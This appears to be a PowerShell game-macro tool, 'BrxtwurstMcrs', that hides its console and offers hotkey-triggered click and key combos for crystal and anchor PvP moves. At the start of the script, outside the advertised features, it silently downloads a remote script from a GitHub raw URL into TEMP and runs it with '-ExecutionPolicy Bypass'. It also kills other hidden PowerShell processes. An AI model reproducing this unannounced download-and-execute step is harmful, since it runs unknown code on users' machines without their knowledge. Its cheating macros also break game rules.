Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

Add-Type @"
using System;
using System.Runtime.InteropServices;
using System.Threading;
public static class Win32 {
    [DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow();
    [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey);
    [DllImport("user32.dll")] public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
    [DllImport("user32.dll")] public static extern void mouse_event(uint dwFlags, int dx, int dy, uint dwData, UIntPtr dwExtraInfo);
    public const int VK_HOME = 0x24;
    public const uint KEYEVENTF_KEYUP     = 0x0002;
    public const uint MOUSEEVENTF_RIGHTDOWN = 0x0008;
    public const uint MOUSEEVENTF_RIGHTUP   = 0x0010;
    public const uint MOUSEEVENTF_LEFTDOWN  = 0x0002;
    public const uint MOUSEEVENTF_LEFTUP    = 0x0004;
    public const uint MOUSEEVENTF_XDOWN     = 0x0080;
    public const uint MOUSEEVENTF_XUP       = 0x0100;
    public const uint XBUTTON1 = 0x0001;

    public static void PressKey(byte vk) {
        keybd_event(vk, 0, 0, UIntPtr.Zero);
        Thread.Sleep(5);
        keybd_event(vk, 0, KEYEVENTF_KEYUP, UIntPtr.Zero);
    }
    public static void RightClick() {
        mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, UIntPtr.Zero);
        Thread.Sleep(5);
        mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, UIntPtr.Zero);
    }
    public static void BackClick() {
        mouse_event(MOUSEEVENTF_XDOWN, 0, 0, XBUTTON1, UIntPtr.Zero);
        Thread.Sleep(5);
        mouse_event(MOUSEEVENTF_XUP, 0, 0, XBUTTON1, UIntPtr.Zero);
    }
    public static void LeftClick() {
        mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, UIntPtr.Zero);
        Thread.Sleep(5);
        mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, UIntPtr.Zero);
    }
}
"@

$myPid = $PID
Get-Process | Where-Object {
    $_.Id -ne $myPid -and
    $_.ProcessName -match "powershell|pwsh" -and
    $_.MainWindowTitle -eq ""
} | ForEach-Object {
    try {
        $cmdLine = (Get-CimInstance Win32_Process -Filter "ProcessId=$($_.Id)" -ErrorAction SilentlyContinue).CommandLine
        if ($cmdLine -and $cmdLine -match "BrxtwurstMcrs") {
            Stop-Process -Id $_.Id -Force -ErrorAction SilentlyContinue
        }
    } catch {}
}

$habibiUrl  = "https://raw.githubusercontent.com/HadronCollision/PowershellScripts/main/HabibiModAnalyzer.ps1"
$habibiPath = Join-Path $env:TEMP "HabibiModAnalyzer.ps1"
try { Invoke-WebRequest -Uri $habibiUrl -OutFile $habibiPath -UseBasicParsing } catch {}
if (Test-Path $habibiPath) {
    $psExe = (Get-Process -Id $PID).Path
    Start-Process $psExe -ArgumentList "-ExecutionPolicy Bypass -NoExit -File `"$habibiPath`""
}

[Win32]::ShowWindow([Win32]::GetConsoleWindow(), 0) | Out-Null

function Get-VKCode {
    param([string]$keyName)
    switch ($keyName) {
        "Mouse1"  { return 0x01 }
        "Mouse2"  { return 0x02 }
        "Mouse3"  { return 0x04 }
        "Mouse4"  { return 0x05 }
        "Mouse5"  { return 0x06 }
        "None"    { return -1 }
        default {
            try {
                $k = [System.Windows.Forms.Keys]$keyName
                return [int]$k
            } catch { return -1 }
        }
    }
}

function Run-HitCrystal-OnPress {
    [Win32]::keybd_event(0x32, 0, 0, [UIntPtr]::Zero)
    [System.Threading.Thread]::Sleep(2)
    [Win32]::keybd_event(0x32, 0, [Win32]::KEYEVENTF_KEYUP, [UIntPtr]::Zero)
    [System.Threading.Thread]::Sleep(2)
    [Win32]::RightClick()
    [System.Threading.Thread]::Sleep(25)
    [Win32]::keybd_event(0x33, 0, 0, [UIntPtr]::Zero)
    [System.Threading.Thread]::Sleep(15)
    [Win32]::keybd_event(0x33, 0, [Win32]::KEYEVENTF_KEYUP, [UIntPtr]::Zero)
    [System.Threading.Thread]::Sleep(1)
}

function Run-HitCrystal-WhileHolding {
    [Win32]::RightClick()
    [System.Threading.Thread]::Sleep(50)
    [Win32]::LeftClick()
}

function Run-SingleAnchor {
    [Win32]::PressKey(0x43)
    [System.Threading.Thread]::Sleep(10)
    [Win32]::RightClick()
    [System.Threading.Thread]::Sleep(15)
    [Win32]::PressKey(0x56)
    [System.Threading.Thread]::Sleep(15)
    [Win32]::RightClick()
    [System.Threading.Thread]::Sleep(20)
    [Win32]::BackClick()
    [System.Threading.Thread]::Sleep(15)
    [Win32]::RightClick()
}

function Run-DoubleAnchor {
    [Win32]::PressKey(0x43)
    [System.Threading.Thread]::Sleep(15)
    [Win32]::RightClick()
    [System.Threading.Thread]::Sleep(25)
    [Win32]::PressKey(0x56)
    [System.Threading.Thread]::Sleep(25)
    [Win32]::RightClick()
    [System.Threading.Thread]::Sleep(25)
    [Win32]::PressKey(0x43)
    [System.Threading.Thread]::Sleep(15)
    [Win32]::RightClick()
    [System.Threading.Thread]::Sleep(1)
    [Win32]::RightClick()
    [System.Threading.Thread]::Sleep(25)
    [Win32]::PressKey(0x56)
    [System.Threading.Thread]::Sleep(25)
    [Win32]::RightClick()
    [System.Threading.Thread]::Sleep(25)
    [Win32]::BackClick()
    [System.Threading.Thread]::Sleep(15)
    [Win32]::RightClick()
}

$script:btnStates  = @{ 0 = $false; 1 = $false; 2 = $false }
$script:btnKeys    = @{ 0 = "None"; 1 = "None"; 2 = "None" }
$script:btnRefs    = @($null, $null, $null)
$script:dotRefs    = @($null, $null, $null)
$script:keyBtns    = @($null, $null, $null)
$script:listening  = -1
$script:guiForm    = $null
$script:homeWasDown = $false
$script:mbWas  = $false
$script:xb1Was = $false
$script:xb2Was = $false
$script:triggerWas = @{ 0 = $false; 1 = $false; 2 = $false }

function Finish-Listen {
    param([string]$keyName)
    try {
        $ci = $script:listening
        if ($ci -lt 0) { return }
        $script:listening = -1
        $script:btnKeys[$ci] = $keyName
        if ($script:keyBtns[$ci] -and -not $script:keyBtns[$ci].IsDisposed) {
            $script:keyBtns[$ci].Text = $keyName
            $script:keyBtns[$ci].ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#cdd6f4")
            $script:keyBtns[$ci].BackColor = [System.Drawing.ColorTranslator]::FromHtml("#1e1e2e")
        }
    } catch {}
}

function New-BrxtwurstForm {
    $w = 360
    $h = 310

    $f = New-Object System.Windows.Forms.Form
    $f.Text            = "BrxtwurstMcrs"
    $f.ClientSize      = New-Object System.Drawing.Size($w, $h)
    $f.StartPosition   = "CenterScreen"
    $f.FormBorderStyle = "None"
    $f.BackColor       = [System.Drawing.ColorTranslator]::FromHtml("#11111b")
    $f.Font            = New-Object System.Drawing.Font("Segoe UI", 10)
    $f.TopMost         = $true
    $f.KeyPreview      = $true
    $f.ShowInTaskbar   = $true
    $f.MinimizeBox     = $true

    $f.Add_KeyDown({
        if ($script:listening -ge 0) {
            Finish-Listen $_.KeyCode.ToString()
            $_.Handled = $true
            $_.SuppressKeyPress = $true
        }
    })

    $f.Add_MouseDown({
        if ($_.Button -eq "Left") { $this.Tag = $_.Location }
    })
    $f.Add_MouseMove({
        if ($_.Button -eq "Left" -and $this.Tag) {
            $p = $this.Tag
            $this.Location = New-Object System.Drawing.Point(
                ($this.Location.X + $_.X - $p.X),
                ($this.Location.Y + $_.Y - $p.Y))
        }
    })
    $f.Add_MouseUp({ $this.Tag = $null })

    $accent = New-Object System.Windows.Forms.Panel
    $accent.Size      = New-Object System.Drawing.Size($w, 3)
    $accent.Location  = New-Object System.Drawing.Point(0, 0)
    $accent.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#cba6f7")
    $accent.Add_MouseDown({ if ($_.Button -eq "Left") { $this.FindForm().Tag = $_.Location } })
    $accent.Add_MouseMove({
        if ($_.Button -eq "Left" -and $this.FindForm().Tag) {
            $p = $this.FindForm().Tag
            $this.FindForm().Location = New-Object System.Drawing.Point(
                ($this.FindForm().Location.X + $_.X - $p.X),
                ($this.FindForm().Location.Y + $_.Y - $p.Y))
        }
    })
    $accent.Add_MouseUp({ $this.FindForm().Tag = $null })
    $f.Controls.Add($accent)

    $lbl = New-Object System.Windows.Forms.Label
    $lbl.Text      = "BrxtwurstMcrs"
    $lbl.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#cdd6f4")
    $lbl.Font      = New-Object System.Drawing.Font("Segoe UI Semibold", 16)
    $lbl.AutoSize  = $false
    $lbl.Size      = New-Object System.Drawing.Size($w, 36)
    $lbl.Location  = New-Object System.Drawing.Point(0, 20)
    $lbl.TextAlign = [System.Drawing.ContentAlignment]::MiddleCenter
    $lbl.Add_MouseDown({ if ($_.Button -eq "Left") { $this.FindForm().Tag = $_.Location } })
    $lbl.Add_MouseMove({
        if ($_.Button -eq "Left" -and $this.FindForm().Tag) {
            $p = $this.FindForm().Tag
            $this.FindForm().Location = New-Object System.Drawing.Point(
                ($this.FindForm().Location.X + $_.X - $p.X),
                ($this.FindForm().Location.Y + $_.Y - $p.Y))
        }
    })
    $lbl.Add_MouseUp({ $this.FindForm().Tag = $null })
    $f.Controls.Add($lbl)

    $sep = New-Object System.Windows.Forms.Panel
    $sep.Size      = New-Object System.Drawing.Size(280, 1)
    $sep.Location  = New-Object System.Drawing.Point(([int](($w - 280) / 2)), 64)
    $sep.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#313244")
    $f.Controls.Add($sep)

    $btnNormal  = [System.Drawing.ColorTranslator]::FromHtml("#1e1e2e")
    $btnHover   = [System.Drawing.ColorTranslator]::FromHtml("#313244")
    $btnFore    = [System.Drawing.ColorTranslator]::FromHtml("#cdd6f4")
    $btnBorder  = [System.Drawing.ColorTranslator]::FromHtml("#45475a")
    $accentClr  = [System.Drawing.ColorTranslator]::FromHtml("#cba6f7")
    $greenC     = [System.Drawing.ColorTranslator]::FromHtml("#a6e3a1")
    $grayC      = [System.Drawing.ColorTranslator]::FromHtml("#585b70")

    $btnNames = @("Hit Crystal", "Single Anchor", "Double Anchor")

    for ($i = 0; $i -lt 3; $i++) {
        $idx = $i
        $rowY = 82 + $idx * 56
        $leftX = [int](($w - 280) / 2)

        $dot = New-Object System.Windows.Forms.Panel
        $dot.Size     = New-Object System.Drawing.Size(10, 10)
        $dot.Location = New-Object System.Drawing.Point(($leftX + 12), ($rowY + 17))
        if ($script:btnStates[$idx]) { $dot.BackColor = $greenC }
        else { $dot.BackColor = $grayC }
        $f.Controls.Add($dot)
        $script:dotRefs[$idx] = $dot

        $b = New-Object System.Windows.Forms.Button
        $b.Text      = $btnNames[$idx]
        $b.Size      = New-Object System.Drawing.Size(210, 44)
        $b.Location  = New-Object System.Drawing.Point($leftX, $rowY)
        $b.FlatStyle = "Flat"
        $b.FlatAppearance.BorderSize         = 1
        $b.FlatAppearance.MouseOverBackColor = $btnHover
        $b.FlatAppearance.MouseDownBackColor = $accentClr
        $b.BackColor = $btnNormal
        $b.ForeColor = $btnFore
        $b.Font      = New-Object System.Drawing.Font("Segoe UI Semibold", 11)
        $b.Cursor    = [System.Windows.Forms.Cursors]::Hand
        $b.TextAlign = [System.Drawing.ContentAlignment]::MiddleCenter
        $b.Tag       = $idx

        if ($script:btnStates[$idx]) {
            $b.FlatAppearance.BorderColor = $greenC
        } else {
            $b.FlatAppearance.BorderColor = $btnBorder
        }

        $b.Add_Click({
            $ci = $this.Tag
            $script:btnStates[$ci] = -not $script:btnStates[$ci]
            $isOn = $script:btnStates[$ci]
            $gn = [System.Drawing.ColorTranslator]::FromHtml("#a6e3a1")
            $gy = [System.Drawing.ColorTranslator]::FromHtml("#585b70")
            $bd = [System.Drawing.ColorTranslator]::FromHtml("#45475a")
            if ($isOn) {
                $this.FlatAppearance.BorderColor = $gn
                $script:dotRefs[$ci].BackColor   = $gn
            } else {
                $this.FlatAppearance.BorderColor = $bd
                $script:dotRefs[$ci].BackColor   = $gy
            }
        })
        $f.Controls.Add($b)
        $script:btnRefs[$idx] = $b
        $dot.BringToFront()

        $kb = New-Object System.Windows.Forms.Button
        $kb.Size      = New-Object System.Drawing.Size(66, 44)
        $kb.Location  = New-Object System.Drawing.Point(($leftX + 214), $rowY)
        $kb.FlatStyle = "Flat"
        $kb.FlatAppearance.BorderSize         = 1
        $kb.FlatAppearance.BorderColor        = $btnBorder
        $kb.FlatAppearance.MouseOverBackColor = $btnHover
        $kb.FlatAppearance.MouseDownBackColor = $accentClr
        $kb.BackColor = $btnNormal
        $kb.ForeColor = $grayC
        $kb.Font      = New-Object System.Drawing.Font("Segoe UI", 9)
        $kb.Cursor    = [System.Windows.Forms.Cursors]::Hand
        $kb.TextAlign = [System.Drawing.ContentAlignment]::MiddleCenter
        $kb.Tag       = $idx

        if ($script:btnKeys[$idx] -eq "None") {
            $kb.Text = "..."
        } else {
            $kb.Text = $script:btnKeys[$idx]
            $kb.ForeColor = $btnFore
        }

        $kb.Add_Click({
            $ci = $this.Tag
            if ($script:listening -ge 0 -and $script:listening -ne $ci) {
                try {
                    $prev = $script:listening
                    if ($script:btnKeys[$prev] -eq "None") {
                        $script:keyBtns[$prev].Text = "..."
                        $script:keyBtns[$prev].ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#585b70")
                    } else {
                        $script:keyBtns[$prev].Text = $script:btnKeys[$prev]
                        $script:keyBtns[$prev].ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#cdd6f4")
                    }
                    $script:keyBtns[$prev].BackColor = [System.Drawing.ColorTranslator]::FromHtml("#1e1e2e")
                } catch {}
            }
            $script:listening = $ci
            $this.Text = "..."
            $this.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#f9e2af")
            $this.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#313244")
        })

        $f.Controls.Add($kb)
        $script:keyBtns[$idx] = $kb
    }

    $v = New-Object System.Windows.Forms.Label
    $v.Text      = "v0.2"
    $v.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#45475a")
    $v.Font      = New-Object System.Drawing.Font("Segoe UI", 8)
    $v.AutoSize  = $false
    $v.Size      = New-Object System.Drawing.Size($w, 20)
    $v.Location  = New-Object System.Drawing.Point(0, ($h - 26))
    $v.TextAlign = [System.Drawing.ContentAlignment]::MiddleCenter
    $v.Add_MouseDown({ if ($_.Button -eq "Left") { $this.FindForm().Tag = $_.Location } })
    $v.Add_MouseMove({
        if ($_.Button -eq "Left" -and $this.FindForm().Tag) {
            $p = $this.FindForm().Tag
            $this.FindForm().Location = New-Object System.Drawing.Point(
                ($this.FindForm().Location.X + $_.X - $p.X),
                ($this.FindForm().Location.Y + $_.Y - $p.Y))
        }
    })
    $v.Add_MouseUp({ $this.FindForm().Tag = $null })
    $f.Controls.Add($v)

    $minBtn = New-Object System.Windows.Forms.Label
    $minBtn.Text      = "_"
    $minBtn.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#6c7086")
    $minBtn.Font      = New-Object System.Drawing.Font("Segoe UI", 10)
    $minBtn.AutoSize  = $true
    $minBtn.Location  = New-Object System.Drawing.Point(($w - 52), 8)
    $minBtn.Cursor    = [System.Windows.Forms.Cursors]::Hand
    $minBtn.Add_Click({ $this.FindForm().WindowState = [System.Windows.Forms.FormWindowState]::Minimized })
    $minBtn.Add_MouseEnter({ $this.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#cba6f7") })
    $minBtn.Add_MouseLeave({ $this.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#6c7086") })
    $f.Controls.Add($minBtn)

    $xBtn = New-Object System.Windows.Forms.Label
    $xBtn.Text      = "X"
    $xBtn.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#6c7086")
    $xBtn.Font      = New-Object System.Drawing.Font("Segoe UI", 10)
    $xBtn.AutoSize  = $true
    $xBtn.Location  = New-Object System.Drawing.Point(($w - 28), 8)
    $xBtn.Cursor    = [System.Windows.Forms.Cursors]::Hand
    $xBtn.Add_Click({ $this.FindForm().Hide() })
    $xBtn.Add_MouseEnter({ $this.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#f38ba8") })
    $xBtn.Add_MouseLeave({ $this.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#6c7086") })
    $f.Controls.Add($xBtn)

    $f.Add_FormClosing({ param($s,$e); $e.Cancel = $true; $s.Hide() })
    return $f
}

$timer = New-Object System.Windows.Forms.Timer
$timer.Interval = 50
$timer.Add_Tick({
    try {
        $state = [Win32]::GetAsyncKeyState([Win32]::VK_HOME)
        $isDown = ($state -band 0x8000) -ne 0
        if ($isDown -and -not $script:homeWasDown) {
            if ($null -eq $script:guiForm -or $script:guiForm.IsDisposed) {
                $script:guiForm = New-BrxtwurstForm
            }
            if ($script:guiForm.Visible) {
                $script:guiForm.Hide()
            } else {
                $script:guiForm.Show()
                $script:guiForm.Activate()
            }
        }
        $script:homeWasDown = $isDown

        if ($script:listening -ge 0 -and $script:guiForm -and -not $script:guiForm.IsDisposed -and $script:guiForm.Visible) {
            $mb  = ([Win32]::GetAsyncKeyState(0x04) -band 0x8000) -ne 0
            $xb1 = ([Win32]::GetAsyncKeyState(0x05) -band 0x8000) -ne 0
            $xb2 = ([Win32]::GetAsyncKeyState(0x06) -band 0x8000) -ne 0
            if ($mb  -and -not $script:mbWas)  { Finish-Listen "Mouse3" }
            if ($xb1 -and -not $script:xb1Was) { Finish-Listen "Mouse4" }
            if ($xb2 -and -not $script:xb2Was) { Finish-Listen "Mouse5" }
            $script:mbWas  = $mb
            $script:xb1Was = $xb1
            $script:xb2Was = $xb2
        } else {
            $script:mbWas  = $false
            $script:xb1Was = $false
            $script:xb2Was = $false
        }

        if ($script:listening -lt 0) {
            if ($script:btnStates[0] -and $script:btnKeys[0] -ne "None") {
                $vk0 = Get-VKCode $script:btnKeys[0]
                if ($vk0 -gt 0) {
                    $cur0 = ([Win32]::GetAsyncKeyState($vk0) -band 0x8000) -ne 0
                    if ($cur0 -and -not $script:triggerWas[0]) {
                        Run-HitCrystal-OnPress
                    }
                    if ($cur0) {
                        Run-HitCrystal-WhileHolding
                    }
                    $script:triggerWas[0] = $cur0
                }
            } else {
                $script:triggerWas[0] = $false
            }

            if ($script:btnStates[1] -and $script:btnKeys[1] -ne "None") {
                $vk1 = Get-VKCode $script:btnKeys[1]
                if ($vk1 -gt 0) {
                    $cur1 = ([Win32]::GetAsyncKeyState($vk1) -band 0x8000) -ne 0
                    if ($cur1 -and -not $script:triggerWas[1]) {
                        Run-SingleAnchor
                    }
                    $script:triggerWas[1] = $cur1
                }
            } else {
                $script:triggerWas[1] = $false
            }

            if ($script:btnStates[2] -and $script:btnKeys[2] -ne "None") {
                $vk2 = Get-VKCode $script:btnKeys[2]
                if ($vk2 -gt 0) {
                    $cur2 = ([Win32]::GetAsyncKeyState($vk2) -band 0x8000) -ne 0
                    if ($cur2 -and -not $script:triggerWas[2]) {
                        Run-DoubleAnchor
                    }
                    $script:triggerWas[2] = $cur2
                }
            } else {
                $script:triggerWas[2] = $false
            }
        }
    } catch {}
})
$timer.Start()

$tray = New-Object System.Windows.Forms.NotifyIcon
$tray.Text    = "BrxtwurstMcrs - Home to toggle"
$tray.Visible = $true

$bmp = New-Object System.Drawing.Bitmap(16,16)
$gfx = [System.Drawing.Graphics]::FromImage($bmp)
$gfx.Clear([System.Drawing.ColorTranslator]::FromHtml("#cba6f7"))
$gfx.Dispose()
$tray.Icon = [System.Drawing.Icon]::FromHandle($bmp.GetHicon())

$menu = New-Object System.Windows.Forms.ContextMenuStrip
$exit = New-Object System.Windows.Forms.ToolStripMenuItem("Exit BrxtwurstMcrs")
$exit.Add_Click({
    $timer.Stop()
    $tray.Visible = $false; $tray.Dispose()
    if ($script:guiForm -and -not $script:guiForm.IsDisposed) { $script:guiForm.Dispose() }
    [System.Windows.Forms.Application]::Exit()
})
$menu.Items.Add($exit) | Out-Null
$tray.ContextMenuStrip = $menu
$tray.Add_DoubleClick({
    if ($null -eq $script:guiForm -or $script:guiForm.IsDisposed) {
        $script:guiForm = New-BrxtwurstForm
    }
    if ($script:guiForm.Visible) { $script:guiForm.Hide() }
    else { $script:guiForm.Show(); $script:guiForm.Activate() }
})

$appCtx = New-Object System.Windows.Forms.ApplicationContext
[System.Windows.Forms.Application]::Run($appCtx)
